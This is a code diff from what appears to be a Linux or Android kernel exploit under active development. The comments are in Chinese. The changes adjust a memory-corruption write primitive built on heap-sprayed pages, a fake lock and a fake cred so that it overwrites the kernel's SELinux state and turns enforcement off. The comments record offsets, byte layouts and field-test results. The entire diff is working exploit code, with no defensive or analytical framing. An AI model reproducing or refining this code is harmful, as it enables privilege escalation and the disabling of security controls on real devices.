@@ -901,36 +901,39 @@ int run_exploit(int argc, char **argv) {
            * ── mt78 (E5v3, 2026-09-05) ──
            * ★写值合法形态(rb_erase 反汇编核实): 0(单 store)或「可写牺牲
            *   指针」(双 store, 附带污染该指针+0 处 8 字节)。小常数一律 panic。★
-           * 巧解: child=fake_lock(喷页零区页对齐地址), 其地址字节即目标布局:
-           *   byte0=0x00(页对齐) → enforcing=0
-           *   byte2=(addr>>16)&0xff ≠0 → initialized=1(★保留, 运行时校验★)
-           *   byte1=checkreqprot≠0(按请求 prot 检查, 窗口期内无害)
-           *   byte3..7=policycap 随机位(多数特性未用, 低风险)
-           *   STORE(b) *(fake_lock)=pc → 污染牺牲喷页零区 ✓
-           * E5R(还原): VALUE=SPRAY1 → child=fake_lock+1 → byte0=1 →
-           *   enforcing=1, byte2 不变(无进位)。与 R 几何(7/7 无事故)同构。
-           * VALUE 语义重定义: "SPRAY"(默认)=fake_lock; "SPRAY1"=fake_lock+1;
-           *   "0"=E5v1 全零写(单 store, 已知黑屏风险, 仅受控对照);
-           *   其它数字一律 ABORT 并打原因(防再犯 §5.1)。 */
+           * 巧解: child=喷页「真·页对齐」地址, 其地址字节即目标布局。
+           * ── mt79 (E5v3r2, 2026-09-06 现场修正) ──
+           * mt78 首轮实证: fake_lock = payload_base+0x1350, 而 payload_base =
+           * page_base-0xe80 (skb 数据区非页对齐) → fake_lock 尾字节=0xd0,
+           * 运行时校验正确 ABORT(零事故). 修正: child 改用 ★page_base★
+           * (main.c 现成变量, 真页对齐, 与 mt55 假 cred 公式同一 page_base):
+           *   SPRAY:  child=page_base   → byte0=00(enforcing=0)
+           *   SPRAY1: child=page_base+1 → byte0=01(E5R 还原 enforcing=1)
+           *   byte2=(page_base>>16)&0xff 实测 0x2c≠0 (initialized 保留, 校验把关)
+           *   STORE(b) *(child+0)=pc → 污染页首(+0 或 +1..+9)零区:
+           *   put64 布局只写 LOCK_OFF(0x1350)/W0_OFF(0x2220)/SCRATCH(0x3000)/
+           *   假cred(0x3800)/security(0x3900) — 页首 0xe80 区从未被写, 牺牲安全 ✓
+           * VALUE 语义(承 mt78): "SPRAY"(默认)=page_base, "SPRAY1"=page_base+1,
+           *   "0"=E5v1 全零写(仅受控对照), 其它数字一律 ABORT(防 §5.1)。 */
           uintptr_t enf_alias = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF);
           uint64_t mt78_child;
           const char *mt78_mode = getenv("PSELECT_SELINUX_ENF_VALUE");
           if (!mt78_mode || !*mt78_mode || !strcmp(mt78_mode, "SPRAY")) {
             mt78_mode = "SPRAY";
-            if (!fake_lock) {
-              pr_error("mt78: E5v3 %s but no spray page (fake_lock=0) - ABORT\n",
+            if (!page_base) {
+              pr_error("mt79: E5v3 %s but no spray page (page_base=0) - ABORT\n",
                        mt78_mode);
               fflush(stdout);
               break;
             }
-            mt78_child = (uint64_t)(size_t)fake_lock;
+            mt78_child = (uint64_t)(size_t)page_base;
           } else if (!strcmp(mt78_mode, "SPRAY1")) {
-            if (!fake_lock) {
-              pr_error("mt78: E5v3 SPRAY1 but no spray page (fake_lock=0) - ABORT\n");
+            if (!page_base) {
+              pr_error("mt79: E5v3 SPRAY1 but no spray page (page_base=0) - ABORT\n");
               fflush(stdout);
               break;
             }
-            mt78_child = (uint64_t)(size_t)fake_lock + 1;
+            mt78_child = (uint64_t)(size_t)page_base + 1;
           } else if (!strcmp(mt78_mode, "0")) {
             mt78_child = 0; /* E5v1 全零写: 单 store, 已知黑屏风险, 仅受控对照 */
           } else {
@@ -963,7 +966,7 @@ int run_exploit(int argc, char **argv) {
                    (size_t)((enf_alias - 8) & ~3ULL));
           snprintf(right_env, sizeof(right_env), "%zx", (size_t)mt78_child);
           snprintf(left_env, sizeof(left_env), "0");
-          pr_info("mt78: E5v3 SELINUX_ENF pc=%s child=%llx mode=%s "
+          pr_info("mt79: E5v3r2 SELINUX_ENF pc=%s child=%llx mode=%s "
                   "(enforcing=%02x checkreqprot=%02x initialized@+2=%02x)\n",
                   pc_env, (unsigned long long)mt78_child, mt78_mode,
                   mt78_b0, mt78_b1, mt78_b2);
